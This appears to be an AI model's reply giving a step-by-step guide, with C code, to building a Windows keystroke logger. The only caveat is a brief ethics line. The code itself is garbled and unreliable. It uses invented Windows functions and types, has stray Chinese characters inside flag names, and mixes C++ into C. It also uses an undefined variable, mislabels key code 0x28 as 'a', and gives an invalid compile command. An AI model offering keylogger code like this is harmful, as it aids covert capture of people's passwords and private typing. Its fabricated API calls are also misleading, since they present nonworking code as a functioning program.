To create a keystroke-logging application in C, you can use the Windows API functions to monitor keyboard input. Here's a step-by-step guide:

### Step 1: Include Necessary Headers and Libraries

Include the required headers for keyboard input and threading:

```c
#include <windows.h>
#include <stdio.h>
#include <thread.h>
#include <queue>
#include <uuid.h>
```

### Step 2: Define Data Structures

Use a queue to store the keystroke data for the main thread to process:

```c
typedef struct
{
    char key;
    int time;
} KEY_STROKE;
```

### Step 3: Define the Callback Function

The callback function will be invoked for each key event:

```c
void KeyCallback(int hDevice, int bKeyState, int dwExtraInfo, void* context)
{
    if (bKeyState)
    {
        // Key is pressed
        if (fbooster->queue != NULL)
        {
            KEY_STROKE ks;
            ks.key = (char) GetAsyncKeyState(0x28); // Assume 0x28 is the 'a' key
            ks.time = time(0);
            fbooster->queue->push(ks);
        }
    }
}
```

### Step 4: Initialize the Keyboard Booster

This function sets up the keyboard monitoring:

```c
void InitializeKeyboardBooster(void)
{
    HFOCUS hFocus = 0;
    DWORD dwResult;

    EnumerateKeyboards(&hFocus, KEYBOARDF管理员工线程 | KEYBOARDF_NAME_RESPONSE | KEYBOARDF击打模式);

    while (hFocus != 0)
    {
        GetKeyboardLayout(hFocus, &dwResult);
        SetKeyboardHook(hFocus, KeyCallback, (void*)(&fbooster));
        hFocus = NextKeyboard(hFocus);
    }
}
```

### Step 5: Create and Start the Booster

Initialize the booster and start the thread to process keystrokes:

```c
int main()
{
    KeyboardBooster booster;
    booster.InitializeKeyboardBooster();
    booster.Start();

    return 0;
}
```

### Step 6: Handle the Keystrokes in the Main Thread

Extract keystrokes from the queue:

```c
void BoosterThread(void* context)
{
    KeyboardBooster booster;
    while (true)
    {
        if (booster.queue->size() > 0)
        {
            KEY_STROKE key = booster.queue->front();
            printf("Keystroke: %c at %d\n", key.key, key.time);
            booster.queue->pop();
        }
        Sleep(100); // Check every 100ms
    }
}
```

### Step 7: Compile and Run

Link the C file and run it. Test it on a virtual machine to avoid affecting the actual system.

```cmd
gcc keyboard_log.c -link libkernel32.lib -m32
```

### Note: Legal Considerations

Ensure you have proper permissions and use this tool ethically.

This code provides a basic framework for logging keystrokes. Adjust the callback to handle all necessary key presses and key types as needed.<｜end▁of▁sentence｜>

